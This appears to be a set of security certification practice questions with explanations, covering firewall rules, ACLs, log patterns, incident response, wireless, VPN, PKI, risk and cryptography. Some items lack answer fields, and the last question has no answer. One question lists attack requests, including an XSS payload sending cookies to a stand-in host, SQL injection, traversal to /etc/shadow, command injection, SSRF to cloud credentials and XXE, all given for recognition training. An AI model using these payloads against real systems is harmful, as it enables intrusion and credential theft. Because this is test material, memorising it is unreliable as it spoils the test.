scenario: You are configuring the edge firewall for a company that hosts its public services in a screened subnet. The firewall applies one rule list to all traffic, top to bottom, first match wins.
exhibit:
Internet ── [FW-EDGE] ──┬── DMZ 172.16.10.0/24
                        │     WEB01   172.16.10.10   public website, HTTPS only
                        │     MAIL01  172.16.10.25   inbound mail relay
                        │     DNS01   172.16.10.53   authoritative public DNS
                        │
                        └── LAN 10.10.0.0/16
                              DB01    10.10.5.20     SQL Server (TCP 1433)
                              ADMIN   10.10.99.0/24  administrator jump hosts
stem: Complete the rule table so that it meets every requirement and follows least privilege.
requirements: Anyone on the internet can reach the public website, but only over an encrypted connection.
Other mail servers on the internet can deliver email to MAIL01.
Anyone on the internet can resolve names from DNS01. Zone transfers must not be possible from the internet.
WEB01 can query the database on DB01. No other DMZ server can.
Administrators can manage every DMZ server, but only from the jump host subnet and only with an encrypted shell.

rows.why: HTTPS is TCP 443 and the destination is the single web server, not the whole DMZ. Port 80 would allow unencrypted HTTP, which the requirement rules out.
Mail servers relay to each other on SMTP, TCP 25. Port 587 is message submission from email clients, not server-to-server delivery.
Ordinary DNS queries use UDP 53. Zone transfers use TCP 53, so allowing only UDP serves lookups while keeping zone transfers closed. Choosing Any or TCP would expose the zone transfer.
Only WEB01 needs the database, so the source is its single address, not the DMZ subnet. SQL Server listens on TCP 1433, which the exhibit states.

SSH (TCP 22) is the encrypted shell, the jump host subnet is the only permitted source, and the destination is the whole DMZ because every server must be manageable. RDP (3389) is not a shell, and a source of 10.10.0.0/16 would let every internal host in.
The cleanup rule denies everything the earlier rules did not allow. It must be last, because a deny any any placed higher would block the allowed traffic below it.

takeaway: Firewall PBQs are won on precision: single host versus subnet, TCP versus UDP (DNS queries on UDP 53, zone transfers on TCP 53), and the exact service port (25 for relay, 587 for submission).

scenario: A branch office (192.168.50.0/24) connects to headquarters (10.1.0.0/16) over a site-to-site VPN. You are writing the rules on the headquarters firewall for traffic arriving from the branch. The branch guest Wi-Fi uses the upper half of the branch range.
exhibit:
Branch 192.168.50.0/24
  Guest Wi-Fi  192.168.50.128/25
  PRINT01      192.168.50.20   print server

Headquarters 10.1.0.0/16
  DC01   10.1.1.10   domain controller (Kerberos, LDAP)
  FS01   10.1.1.15   file server
  SIEM   10.1.2.50   log collector, accepts syslog over TLS only
stem: Complete the rule table. Rules are processed top to bottom, first match wins.
requirements: Nothing from the branch guest Wi-Fi may reach any headquarters system.
Branch devices can open shares on FS01.
Branch devices can authenticate to DC01 with Kerberos.
Branch devices can query the directory on DC01 over encrypted LDAP.
PRINT01 can send its logs to the SIEM.
All other traffic from the branch is blocked.

rows.why: The guest range sits inside the branch /24, so its deny has to come first. If the broader branch allows came first, guest devices would match them and get in.
Modern SMB file sharing runs directly over TCP 445. Port 139 is legacy NetBIOS session service. Guests already hit rule 1, so the /24 source is safe here.
Kerberos uses port 88 over both UDP and TCP (TCP for larger tickets). Allowing Any protocol would also open ICMP and everything else to the domain controller on that port number.
LDAPS (LDAP over TLS) is TCP 636. Port 389 is plain LDAP and 3268 is the global catalog, neither of which meets the encrypted requirement.

The SIEM accepts syslog over TLS only, which is TCP 6514. Classic syslog on UDP 514 is unencrypted and would be refused by the collector anyway. Only the print server needs this, so the source is its single address.
A final deny for the whole branch range blocks everything not allowed above it.

takeaway: When one range sits inside another, put the more specific rule first. Then know your secure ports: SMB 445, Kerberos 88 (TCP and UDP), LDAPS 636, syslog over TLS 6514.

scenario: A help desk ticket says an administrator at 10.20.30.15 cannot SSH to a server even though a rule permits it. You are given the access control list applied inbound on the server VLAN interface.
exhibit:
#  Action  Proto  Source           Destination     Port
 1  permit  tcp    10.20.0.0/16     10.50.1.10      443
 2  deny    tcp    10.20.30.0/24    10.50.1.0/24    any
 3  permit  tcp    10.20.30.15      10.50.1.20      22
 4  permit  udp    any              10.50.1.53      53
 5  deny    ip     10.20.0.0/16     10.50.1.0/24    any
 6  permit  ip     10.99.0.0/24     10.50.1.0/24    any
    (implicit deny ip any any)
stem: Trace each connection attempt through the ACL and choose the outcome and the rule that decides it.

prompts.label: 10.20.30.15 to 10.50.1.20, TCP 22 (the administrator's SSH)
prompts.why: Rule 1 does not match because the destination is not 10.50.1.10. Rule 2 matches: the source is inside 10.20.30.0/24, the destination is inside 10.50.1.0/24 and it is TCP. Rule 3 is never reached, so it is shadowed. The fix is to move rule 3 above rule 2.

prompts.label: 10.20.30.15 to 10.50.1.10, TCP 443
prompts.why: Rule 1 matches first: 10.20.30.15 is inside 10.20.0.0/16 and the destination and port match. The deny in rule 2 is never evaluated for this packet.

prompts.label: 10.20.30.15 to 10.50.1.53, UDP 53
prompts.why: Rule 2 only denies TCP, so this UDP query falls through to rule 4, which permits UDP 53 to the DNS server from any source.

prompts.label: 10.20.44.7 to 10.50.1.53, TCP 53 (a zone transfer attempt)
prompts.why: Rule 2 does not match because 10.20.44.7 is outside 10.20.30.0/24. Rule 4 only permits UDP. Rule 5 denies all IP traffic from 10.20.0.0/16 to the server subnet, so the TCP zone transfer stops there.

prompts.label: 10.99.0.8 to 10.50.1.20, TCP 3389
prompts.why: None of rules 1 to 5 match a 10.99.0.0/24 source, and rule 6 permits all IP traffic from that subnet to the server VLAN, including RDP.

prompts.label: 172.16.4.4 to 10.50.1.10, TCP 443
prompts.why: Rule 1 only permits sources in 10.20.0.0/16, rule 4 is UDP, and rules 5 and 6 do not match this source. With no explicit match, the implicit deny at the end drops it.

takeaway: Read an ACL like the device does: check every field of each rule in order and stop at the first full match. A specific permit placed below a broader deny is shadowed and never works.

scenario: Your SIEM raised several alerts overnight. Each excerpt below comes from a different data source.
stem: Identify the activity that each excerpt shows.

prompts.label:
Firewall: DENY TCP 198.51.100.7:51234 → 10.0.0.5:21
DENY TCP 198.51.100.7:51235 → 10.0.0.5:22
DENY TCP 198.51.100.7:51236 → 10.0.0.5:23
…1,020 more, one per destination port, within 3 seconds
prompts.why: One source touching sequential destination ports on one host in seconds is a port scan, the reconnaissance step that maps which services are listening.

prompts.label:
sshd: Failed password for root from 203.0.113.9 (1,840 times in 9 minutes)
sshd: Accepted password for root from 203.0.113.9
prompts.why: Many guesses against one account from one source is brute force, and the final Accepted line means it worked. Treat the host as compromised, not just attacked.

prompts.label: Identity provider: password 'Autumn2026!' tried once against each of 914 different accounts from one IP, no lockouts
prompts.why: One common password tried once per account across many accounts, staying under the lockout threshold, is password spraying rather than brute force against a single account.

prompts.label: DNS logs: host 10.0.4.17 sent 11,900 TXT queries in one hour, each to a different random subdomain such as mzxw6ytbojrwy3dp.cdn-sync.example
prompts.why: Huge numbers of unique, encoded-looking subdomains under one domain, often with TXT records, are how DNS tunneling smuggles data out through a protocol firewalls usually allow.

prompts.label: Proxy: 10.0.7.33 → 185.220.101.4:443 every 60 s (±2 s), 512 bytes out and 128 bytes in, all night, user logged off
prompts.why: Small, regular, automated connections at a fixed interval with nobody logged in are beaconing: malware checking in with its C2 server for instructions.

prompts.label: Edge router: 2 Gbps of UDP 53 responses arriving at 10.0.0.9 from 4,800 different resolvers; 10.0.0.9 sent no DNS queries
prompts.why: Large DNS responses the victim never asked for, from thousands of open resolvers, mean an attacker spoofed the victim's address in small queries. The resolvers reflect and amplify the traffic.

prompts.label: VPN: user jsmith signed in from Chicago at 09:02 and from Singapore at 09:20 the same day
prompts.why: Nobody can travel between those cities in 18 minutes, so the two sign-ins cannot both be the real user. It points to stolen credentials or a shared session.

takeaway: Most log PBQs hinge on the pattern, not the protocol: one source and many ports is a scan, one password and many accounts is spraying, fixed-interval tiny connections are beaconing.

scenario: A compromised Linux server is still running. You have been authorized to collect evidence before it is rebuilt, and you must follow the order of volatility.
stem: Put the evidence sources in the order you should collect them, most volatile first.

items.why: Registers and cache change with every instruction, so they are the most volatile and are captured first (in practice, as part of a live response).

items.text: Routing table, ARP cache, process table and the rest of RAM
items.why: Memory holds running processes, network connections and decrypted keys, and it disappears at power-off. Capture it right after the CPU state.

items.text: Temporary file systems and swap space
items.why: /tmp and swap survive longer than RAM but are routinely overwritten or cleared at reboot, so they come next.
Disk contents persist through power loss, so a forensic image (taken with a write blocker and hashed) can wait until the volatile data is safe.

items.text: Remote logs and monitoring data on the SIEM
items.why: Logs already shipped off the host are not affected by anything on the server, but they still rotate out on a retention schedule, so they come before archives.
Offline backups change least of all and are the least volatile source, so they are collected last.

takeaway: Order of volatility (RFC 3227): registers and cache, memory, temporary file systems, disk, remote logs, then archival media. Collect what disappears first.

scenario: EDR alerts show ransomware encrypting shares on a file server. Investigators later find the attacker entered through an unpatched VPN appliance using a stolen account.
stem: Put the response actions in the order the incident response process calls for.

items.text: Correlate the EDR alert with file server and VPN logs to confirm the incident and its scope
items.why: Detection and analysis come first: you confirm it is real and work out which systems and accounts are involved before acting.

items.text: Disconnect the file server from the network and disable the stolen account
items.why: Containment stops the spread. Isolating the server, rather than powering it off, keeps memory evidence intact.

items.text: Capture memory and image the server's disk, recording the chain of custody
items.why: Evidence is preserved before anything is removed or rebuilt, because eradication destroys the artifacts investigators need.

items.text: Remove the ransomware and its persistence, and patch the VPN appliance
items.why: Eradication removes the cause, including the entry point. Restoring before patching the VPN would let the attacker straight back in.

items.text: Restore the shares from clean offline backups and monitor closely
items.why: Recovery brings services back from known-good copies, with extra monitoring in case anything was missed.

items.text: Hold a lessons-learned review and update the ransomware playbook
items.why: The post-incident review is last, once the facts are in, and its output improves the preparation phase for next time.

takeaway: Analyze, contain, preserve evidence, eradicate (including the entry point), recover, then learn. Fixing the root cause before restoring is the step people most often put in the wrong place.

scenario: A hospital is replacing its wireless network. Requirements: staff devices are company managed and must authenticate with individual credentials but no passwords; guests need internet access only and must not see each other; the network must resist evil twin and deauthentication attacks; nothing may be configurable by pressing a button on an access point.
stem: Choose the setting for each item.

prompts.label: Security mode
prompts.why: Individual credentials require Enterprise mode (802.1X). Personal mode uses one shared passphrase for everyone, and WEP and open networks are not acceptable for staff.

prompts.label: EAP method
prompts.why: EAP-TLS authenticates each managed device with its own certificate, so there is no password at all. PEAP and EAP-TTLS still rely on passwords inside the tunnel, and LEAP is broken.

prompts.label: Authentication server
choices: LDAP directory queried directly by the access points
Local user list on each access point
prompts.why: 802.1X access points act as authenticators and pass EAP to a RADIUS server. TACACS+ is for device administration, and access points do not speak EAP to LDAP or Kerberos directly.

prompts.label: Protected Management Frames (802.11w)
prompts.why: Forged deauthentication frames only work because management frames were unauthenticated. Required PMF blocks them, and WPA3 mandates it anyway. Optional would let older clients connect without protection.

prompts.label: Encryption
choices: WPA2-Personal with the passphrase posted in the lobby
prompts.why: OWE encrypts each guest's traffic without a shared password, and client isolation stops guests reaching each other. A posted WPA2 passphrase lets anyone who knows it decrypt other guests' traffic.

prompts.label: Network placement
choices: Server VLAN behind the internal firewall
prompts.why: Guests are untrusted, so they get their own VLAN that is routed only to the internet, never to internal subnets.

prompts.label: Wi-Fi Protected Setup (WPS)
prompts.why: The requirement bans configuration by button press, and WPS PIN mode can be brute-forced to reveal the passphrase. Disable it entirely.

prompts.label: Rogue and evil twin detection
prompts.why: A WIPS watches the airwaves for rogue and look-alike access points and can contain them. Hidden SSIDs and MAC filters are easily bypassed, and lower power only shrinks coverage.

takeaway: Certificates and no passwords means EAP-TLS over WPA3-Enterprise with RADIUS. Guests get OWE plus isolation on their own VLAN. PMF required stops deauth, WPS off, WIPS for evil twins.

scenario: A site-to-site VPN between headquarters and a new branch will not come up. Policy bans 3DES, MD5, SHA-1, DH groups 1, 2 and 5, IKEv1 aggressive mode and pre-shared keys, and requires the original IP headers of branch traffic to be hidden in transit.
exhibit:
HQ gateway (correct, do not change)
  IKE version ............ IKEv2
  Authentication ......... Certificates
  Encryption ............. AES-256-GCM
  PRF / integrity ........ SHA-384
  DH group ............... 20 (ECP-384)
  IPsec protocol ......... ESP
  Mode ................... Tunnel
  Perfect forward secrecy  Group 20

Branch gateway (current)
  IKEv1 aggressive, pre-shared key, 3DES, SHA-1, DH group 2,
  AH, transport mode, PFS off
stem: Choose the branch gateway setting for each item so that the tunnel comes up and meets policy.

prompts.label: IKE version
prompts.why: Both ends must speak the same IKE version, and HQ runs IKEv2. Aggressive mode is banned because it exposes the identity and hash in the clear.

prompts.label: Authentication
prompts.why: Pre-shared keys are banned and HQ authenticates with certificates, so the branch needs a certificate from the same trusted CA.

prompts.label: Encryption
prompts.why: The proposal must match HQ exactly. AES-256-GCM is also authenticated encryption, while 3DES and RC4 are deprecated.

prompts.label: PRF / integrity
prompts.why: MD5 and SHA-1 are banned, and SHA-384 matches HQ.

prompts.label: Diffie-Hellman group
prompts.why: Groups 2 and 5 are banned. Group 14 is allowed by policy but does not match HQ's group 20, so negotiation would fail.

prompts.label: IPsec protocol
prompts.why: AH only authenticates and provides no confidentiality, and it breaks through NAT. ESP encrypts the payload and matches HQ.

prompts.label: Mode
prompts.why: Hiding the original IP headers requires tunnel mode, which encapsulates the whole original packet. Transport mode protects only the payload and is meant for host-to-host use.

prompts.label: Perfect forward secrecy
prompts.why: PFS gives each Phase 2 key its own fresh Diffie-Hellman exchange, so one stolen key does not expose other sessions. It must match HQ's group 20.

takeaway: IPsec tunnels fail on any mismatch, so copy the working side exactly. Then check policy: ESP over AH for confidentiality, tunnel mode to hide headers, PFS on, no SHA-1, MD5, 3DES or low DH groups.

scenario: You are adding security devices to the network below.
exhibit:
Internet ── [Edge firewall] ──┬── Screened subnet: public web farm, mail relay
                              │
                       [Internal firewall]
                              │
                        [Core switch] ──┬── User VLAN (desktops, laptops)
                                        ├── Server VLAN (file, database, SIEM)
                                        └── Management VLAN (switch and server consoles)
stem: Choose where each device belongs.
choices: Inline in the screened subnet, in front of the web farm
Screened subnet, alongside the public servers
Passive tap on the core link between users and servers
Inline between the core switch and the server VLAN

prompts.label: Web application firewall that must inspect and block malicious HTTP requests before they reach the web servers
prompts.answer: Inline in the screened subnet, in front of the web farm
prompts.why: A WAF has to sit in the traffic path in front of the web servers it protects. Out of line it could only watch, and outside the edge firewall it would also face non-web noise it cannot parse.

prompts.label: Network IDS sensor that must see traffic between users and servers without any chance of disrupting it
prompts.answer: Passive tap on the core link between users and servers
prompts.why: A tap copies traffic passively, so the sensor sees east-west traffic but cannot drop or delay it. Placing it inline would make it a potential point of failure.

prompts.label: Network IPS that must block exploit traffic aimed at the internal servers
prompts.answer: Inline between the core switch and the server VLAN
prompts.why: Prevention means dropping packets, which is only possible inline in front of what it protects. A tap or a mirror port can only alert.

prompts.label: Jump server that administrators must pass through to reach switch and server consoles
prompts.why: The jump host is the controlled gateway into the management network, so it lives there and is the only system allowed to reach the consoles.

prompts.label: VPN concentrator for remote employees
prompts.answer: Screened subnet, alongside the public servers
prompts.why: It must be reachable from the internet but should not sit on the internal network, so the screened subnet lets the internal firewall still filter what remote users can reach.

prompts.label: Honeypot meant to attract attackers probing the company's public services
prompts.answer: Screened subnet, alongside the public servers
prompts.why: A decoy that looks like a public server belongs next to the real public servers, where external attackers will find it, and away from internal data.

prompts.label: SIEM log collector that every segment sends logs to
prompts.why: The collector is an internal server that all segments can reach through the internal firewall, but it should never be exposed to the internet.

takeaway: Prevention devices (WAF, IPS) go inline in front of what they protect; detection devices (IDS) go on a tap or span; anything internet-facing but not public data goes in the screened subnet.

scenario: The PKI team has a list of requests from around the company.
stem: Choose the certificate type or PKI feature that BEST meets each request.
choices: Certificate from the internal CA, with its root pushed to all clients
Offline root CA with an online issuing CA

prompts.label: One certificate must cover example.com, shop.example.com and api.example.net
prompts.why: Subject Alternative Name entries list several unrelated names in one certificate. A wildcard only covers one level under a single domain, so it cannot cover api.example.net.

prompts.label: Developers spin up hundreds of short-lived hosts named <anything>.dev.example.com
prompts.why: *.dev.example.com covers any single label under dev.example.com without reissuing for each new host.

prompts.label: Endpoints must refuse to run PowerShell scripts that IT has not approved
prompts.why: Signing scripts with a code signing certificate lets endpoints enforce an AllSigned policy and detect any script altered after signing.

prompts.label: Employees get browser warnings on the intranet site because the web server issued its own certificate
prompts.answer: Certificate from the internal CA, with its root pushed to all clients
prompts.why: The site needs a certificate from a CA the clients trust. An internal CA whose root is distributed by group policy fits an intranet; buying an EV certificate for an internal name is not possible.

prompts.label: Clients' revocation checks are slow and leak which sites users visit to the CA
prompts.why: With stapling the web server fetches its own signed OCSP response and hands it to clients in the TLS handshake, so clients do not contact the CA at all.

prompts.label: The banking app must reject a valid-looking certificate issued by a compromised public CA
prompts.why: Pinning makes the app accept only the expected certificate or public key, so even a certificate from a trusted but compromised CA is refused.

prompts.label: Lawyers must digitally sign and encrypt email to clients
prompts.why: S/MIME certificates are issued to a person's email address and support both signing and encrypting messages.

prompts.label: The CA's signing key must stay safe even if an online server is compromised
prompts.answer: Offline root CA with an online issuing CA
prompts.why: Keeping the root offline and issuing day-to-day certificates from an intermediate means a compromise only requires revoking the intermediate, not rebuilding the whole chain of trust.

takeaway: SAN covers a list of different names, wildcard covers one level of one domain, stapling fixes revocation privacy and speed, pinning beats compromised CAs, and an offline root protects the trust anchor.

scenario: A distribution warehouse and its contents are valued at $800,000. A serious flood would destroy 25% of that value. The area floods badly about once every 20 years. A flood barrier costs $15,000 per year to lease and maintain, and would reduce serious floods to about once every 100 years.
stem: Calculate each value and make the decision.

prompts.label: Single loss expectancy (SLE)
prompts.why: SLE = asset value x exposure factor = $800,000 x 0.25 = $200,000.

prompts.label: Annualized rate of occurrence (ARO) today
prompts.why: Once every 20 years is 1/20 = 0.05 per year. The 20 itself is the interval, not the rate.

prompts.label: Annualized loss expectancy (ALE) today
prompts.why: ALE = SLE x ARO = $200,000 x 0.05 = $10,000 per year.

prompts.label: ALE with the barrier
prompts.why: The barrier changes the ARO to 1/100 = 0.01, so ALE = $200,000 x 0.01 = $2,000.

prompts.label: Yearly value of the barrier (ALE reduction minus its yearly cost)
prompts.why: It saves $10,000 minus $2,000 = $8,000 of expected loss but costs $15,000, a net of minus $7,000 per year.

prompts.label: Decision
choices: Lease the barrier, because it lowers the ALE
Do not lease the barrier; it costs more than the loss it prevents
Avoid the risk by moving the warehouse immediately
prompts.answer: Do not lease the barrier; it costs more than the loss it prevents
prompts.why: A control should cost less than the reduction in expected loss it buys. Here it costs $7,000 a year more than it saves, so accepting or transferring the risk (flood insurance) is the rational response.

takeaway: SLE = AV x EF, ARO = 1 / years between events, ALE = SLE x ARO, and a safeguard is worth it only if the ALE reduction exceeds its annual cost.

scenario: The WAF on a customer portal recorded the requests below over one afternoon.
stem: Identify the attack each request shows.

prompts.label: GET /search?q=<script>new Image().src='https://x.example/c?'+document.cookie</script>
prompts.why: Script in a parameter that the page echoes back runs in the victim's browser and here steals the session cookie. That is reflected XSS.

prompts.label: GET /item?id=7 UNION SELECT username,password_hash FROM users
prompts.why: Appending a UNION SELECT to a numeric parameter tries to make the database return another table, which is SQL injection.

prompts.label: GET /download?file=..%2f..%2f..%2fetc%2fshadow
prompts.why: Encoded ../ sequences climb out of the intended folder to read a system file, which is directory (path) traversal.

prompts.label: POST /tools/ping   host=8.8.8.8;cat /etc/passwd
prompts.why: The semicolon ends the ping command and starts a second shell command, which is OS command injection.

prompts.label: GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
prompts.why: The server is tricked into fetching an internal address, here the cloud metadata service that hands out credentials. That is SSRF.

prompts.label: POST /upload  <!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/hosts">]><order>&f;</order>
prompts.why: A DOCTYPE that defines an external entity pointing at a local file makes a vulnerable XML parser read the file into the response, which is XXE.

prompts.label: GET /people?user=*)(objectClass=*
prompts.why: The *)( characters close one LDAP filter and open another that matches every object, so the directory returns far more than intended.

takeaway: Learn each injection's fingerprint: <script> is XSS, UNION or ' OR is SQL, ../ is traversal, ; or | is command injection, an internal URL is SSRF, <!ENTITY is XXE, *)( is LDAP.

scenario: An identity team is choosing protocols for several projects.
stem: Choose the protocol that BEST fits each requirement.

prompts.label: Employees sign in once to the corporate identity provider and reach a third-party payroll site, which receives a signed XML assertion
prompts.why: Signed XML assertions from an identity provider to a service provider are SAML web single sign-on.

prompts.label: A new mobile app must sign users in with their existing social or corporate account and receive an ID token describing who they are
prompts.why: OIDC adds authentication and a JSON ID token on top of OAuth 2.0, which is what modern web and mobile sign-in uses.

prompts.label: A photo printing site needs permission to read a user's cloud photo album without ever learning the user's password
prompts.why: This is delegated authorization: the user grants a scoped access token. OAuth by itself does not prove identity to the app, and none is needed here.

prompts.label: Network engineers' logins to routers must be authorized command by command, with the whole session encrypted and logged
prompts.why: TACACS+ separates authentication, authorization and accounting, supports per-command authorization and encrypts the entire payload.

prompts.label: Wireless access points must check staff credentials during 802.1X authentication
prompts.why: 802.1X authenticators forward EAP to a RADIUS server. RADIUS is built for network access, not for authorizing individual device commands.

prompts.label: Domain-joined Windows clients must reach file shares without sending the password over the network, using time-limited tickets
prompts.why: Kerberos issues a ticket-granting ticket and then service tickets, so the password is never sent to the file server. Clock skew breaks it.

prompts.label: An HR application must look up employees' department and manager in the directory over an encrypted connection
prompts.why: Directory queries use LDAP, and LDAPS wraps them in TLS on port 636. The other protocols do not query directory attributes.

takeaway: SAML is XML assertions, OIDC is OAuth plus an ID token for sign-in, OAuth alone is delegated access, RADIUS is network access, TACACS+ is device admin per command, Kerberos is tickets inside a domain, LDAPS is encrypted directory lookups.

scenario: A manufacturer runs a machine controller on Windows 7 because the vendor's software will not run on anything newer. The security team cannot patch it, so they place it on an isolated VLAN, allow access only through a monitored jump host, and alert on any new outbound connection.
stem: Which control type BEST describes this set of measures?

options.text: Compensating, because they stand in for patching that cannot be done
options.why: The recommended control, patching, is impossible, so isolation, a jump host and monitoring together give comparable protection. That substitution is exactly what a compensating control is.

options.text: Corrective, because they repair the risk left by the unpatched system
options.why: Corrective controls act after an incident to restore or fix, such as restoring a backup. Nothing here is responding to an incident that already happened.

options.text: Preventive, because the isolated VLAN stops attacks from reaching it
options.why: The VLAN does prevent some access, but the question asks about the set of measures and why they exist. They exist to replace a control that cannot be applied, which makes compensating the BEST answer.

options.text: Directive, because they instruct staff how to use the legacy system
options.why: Directive controls are policies and instructions that tell people what to do. These are technical measures, not instructions.

takeaway: When a scenario says the normal fix cannot be applied and lists substitutes, the answer is compensating, even if some pieces also look preventive or detective.

scenario: At 2 a.m. a critical vulnerability in the internet-facing load balancer is being actively exploited. The on-call engineer applies the vendor's hotfix immediately, before the change advisory board can meet.
stem: Which of the following should happen NEXT to keep the change compliant with the change management process?

options.text: Document the change and submit it for retroactive review and approval
options.why: Emergency changes are allowed to skip prior approval, but they must still be documented and reviewed after the fact, usually by an emergency CAB, so the record and the configuration baseline stay accurate.

options.text: Roll the hotfix back until the full change advisory board approves it
options.why: Removing the fix would reopen an actively exploited hole. The process exists to manage risk, not to force a dangerous rollback.

options.text: Update the incident response plan to remove the approval requirement
options.why: The approval requirement is part of change management, not incident response, and one emergency does not justify removing a control for every future change.

options.text: Ask the vendor to confirm in writing that the hotfix contains no defects
options.why: Vendor assurances are nice to have but do not replace the organization's own documentation and review of what changed in production.

takeaway: Emergency changes skip the waiting, not the paperwork: document them and get after-the-fact approval.

scenario: A company using a zero trust architecture decides that access to the payroll application must now also require a compliant device and a phishing-resistant MFA method. Nothing about the network path changes.
stem: Which component is MOST directly updated to implement this new requirement?

options.text: The policy engine, which evaluates requests and decides to grant or deny
options.why: The new rule changes the decision logic, and the policy engine is where requests are evaluated against policy and signals such as device health and authentication strength.

options.text: The policy enforcement point, which opens or closes the session
options.why: The enforcement point only carries out the decisions it is given. It does not need to know why access was granted, so the new rule does not live there.

options.text: The policy administrator, which sends session instructions to the gateway
options.why: The administrator translates the engine's decision into instructions for the enforcement point. It does not decide what conditions access requires.

options.text: The implicit trust zone, which sits between the gateway and the application
options.why: The implicit trust zone is the small area behind the enforcement point. It is something zero trust tries to minimize, not a place where policy is configured.

takeaway: Policy engine decides, policy administrator relays, policy enforcement point enforces. New access conditions are decision logic, so they go in the engine.

scenario: An auditor reviews a web application that stores passwords as SHA-256(password + "Acme2024"). The same appended string is used for every user. Two accounts in the sample have identical stored values.
stem: Which of the following is the BEST recommendation?

options.text: Generate a unique random salt per user and hash with a slow algorithm such as Argon2
options.why: A unique salt per user makes identical passwords produce different hashes and forces attackers to crack each one separately, and a deliberately slow algorithm makes each guess expensive. The current design fails on both counts.

options.text: Replace SHA-256 with SHA-512 and keep the shared salt so existing logins still work
options.why: A longer fast hash does not slow attackers meaningfully, and the shared salt still lets one precomputed table attack every account and reveals users who share a password.

options.text: Encrypt the stored hashes with AES-256 using a key kept on the application server
options.why: If the server is compromised the key is right there, and it still leaves the shared salt and fast hash problems untouched.

options.text: Change the shared salt every quarter and force every user to reset their password now
options.why: Rotating a shared salt keeps all its weaknesses: identical passwords still match each other and one table still covers every user until the next rotation.

takeaway: Salts must be unique per password, and password hashing should be slow (bcrypt, PBKDF2, Argon2). Identical stored hashes for two users is the giveaway of a missing or shared salt.

scenario: A purchasing system and a supplier's system exchange orders. Each order carries an HMAC-SHA256 computed with a secret key both companies share. In a dispute, the supplier claims an order for 5,000 units was never sent by the purchaser.
stem: Why can't the HMAC settle the dispute, and what would?

options.text: Both parties share the key, so either could create it; a digital signature would
options.why: An HMAC proves integrity and that the message came from someone holding the shared key, but both parties hold it. A digital signature uses the sender's private key, which only the sender has, and so provides non-repudiation.

options.text: SHA-256 is too weak for legal evidence; switching to HMAC-SHA512 for every message would
options.why: The problem is not the strength of the hash. A stronger HMAC is still created with a key both sides share, so it still cannot prove which side created it.

options.text: HMACs do not detect tampering; adding encryption with AES would
options.why: HMACs do detect tampering, which is their purpose. Encryption adds confidentiality, not proof of who sent the message.

options.text: The HMAC was not timestamped; adding a timestamp field would
options.why: A timestamp shows when, not who. Either party holding the shared key could still compute a valid HMAC over a timestamped message.

takeaway: HMAC gives integrity and authenticity between parties who share a key, but not non-repudiation. Only a private key held by one party (a digital signature) proves who sent it.

scenario: A hospital's database already uses transparent data encryption (TDE) for its data files and backups. A new rule says database administrators must not be able to read patients' Social Security numbers, although they still need to maintain the database.
stem: Which of the following BEST meets the new rule?

options.text: Field-level encryption of the SSN column, keyed outside DBA control
options.why: Encrypting just that column, with keys managed outside the DBA role, means administrators see ciphertext in that field while still running and maintaining the database.

options.text: Full-disk encryption on the database server with a key sealed in its TPM chip
options.why: Full-disk encryption protects against stolen drives. Once the server is running, everyone with database access, including DBAs, sees plaintext.

options.text: Rotating the TDE key every 90 days and storing it in an HSM
options.why: TDE decrypts data transparently for anyone who can query the database, so rotating or protecting its key does nothing to stop a DBA reading the column.

options.text: TLS 1.3 between the application servers and the database
options.why: TLS protects the data in transit on the network. It does not change what a DBA can see when querying the table directly.

takeaway: Encryption only protects against the people who cannot reach the key or the decrypted view. TDE and disk encryption stop thieves of files and drives; field-level encryption can stop privileged insiders.

scenario: A bank is building an internal certificate authority that will sign thousands of device certificates per hour. Its regulator requires that the CA's private key be generated inside FIPS 140-3 Level 3 hardware and never exist outside it in plaintext.
stem: Which of the following BEST meets this requirement?

options.text: A hardware security module attached to the issuing CA
options.why: An HSM generates and uses keys inside tamper-resistant, certified hardware, performs high-volume signing, and never exports private keys in plaintext. That is the textbook fit for a CA.

options.text: A TPM chip on the motherboard of the issuing CA server
options.why: A TPM protects keys for one machine's boot integrity and disk encryption. It is not built for high-throughput signing and is not the expected answer for a CA key at this assurance level.

options.text: A cloud key management service that stores the key encrypted at rest
options.why: A KMS manages keys, but storing a key encrypted at rest is not the same as generating and using it only inside certified tamper-resistant hardware.

options.text: A secure enclave in the administrator's laptop processor
options.why: A secure enclave protects secrets on one device, such as biometric templates. It is not where a production CA performs high-volume signing.

takeaway: TPM protects a single device, secure enclave protects secrets on a phone or laptop, KMS manages keys as a service, and HSM is dedicated tamper-resistant hardware for high-value keys such as a CA's.

scenario: An analytics team needs to join several datasets on customer card number to study purchase patterns. Analysts must never see real card numbers, and only the payments team may map a value back to the real number. The analytics platform must also stay out of PCI DSS scope.
stem: Which technique BEST meets all of these needs?

options.text: Tokenization with a consistent token per card and the vault held by payments
options.why: Each card number maps to the same token, so joins still work, the token has no mathematical link to the card, and only the payments team can look it up in the vault. Systems that hold only tokens can be removed from PCI scope.

options.text: Masking every card number so that only the last four digits are shown
options.why: Many cards share the same last four digits, so joins would merge different customers, and masking cannot be reversed by the payments team.

options.text: Hashing every card number with SHA-256 before loading the datasets
options.why: Card numbers have so little entropy that unsalted hashes can be brute-forced quickly, and a hash cannot be mapped back by the payments team as required.

options.text: Encrypting card numbers with AES and giving the analysts the shared decryption key
options.why: Giving analysts the key lets them see real card numbers, which the requirement forbids, and encrypted card data generally keeps systems in PCI scope.

takeaway: Tokenization swaps sensitive data for a lookup value with no mathematical relationship to it, keeps the original in a vault, and is the classic answer for shrinking PCI scope.

scenario: After a certificate renewal, desktop browsers load the company's site normally, but many Android phones and an API client written in Python fail with "unable to get local issuer certificate". The new certificate is valid, unexpired and issued by a well-known public CA.
stem: What is the MOST likely cause?

options.text: The web server is not sending the intermediate CA certificate in the chain
options.why: Desktop browsers often fetch or cache missing intermediates, which hides the problem, while many mobile and programmatic clients only trust what the server sends plus their root store. Installing the full chain on the server fixes all of them.

options.text: The certificate was issued without the server's name in the SAN field
options.why: A name mismatch produces a hostname error in every client, including desktop browsers, and the message would be about the name, not the issuer.

options.text: The public CA's root certificate has been revoked and removed by the browser vendors
options.why: A revoked or distrusted root would break desktop browsers too, and they are working normally.

options.text: The server is stapling an OCSP response that has already expired
options.why: A stale stapled response usually causes a revocation-related warning, not an inability to build the chain to a trusted issuer.

takeaway: "Works in Chrome, fails on mobile or in scripts" after a renewal is almost always a missing intermediate certificate on the server.

scenario: A retailer suspects that its customer database may be stolen in the future and wants to know immediately if a stolen copy is ever used, even if the theft itself goes unnoticed.
stem: Which deception technique BEST meets this goal?

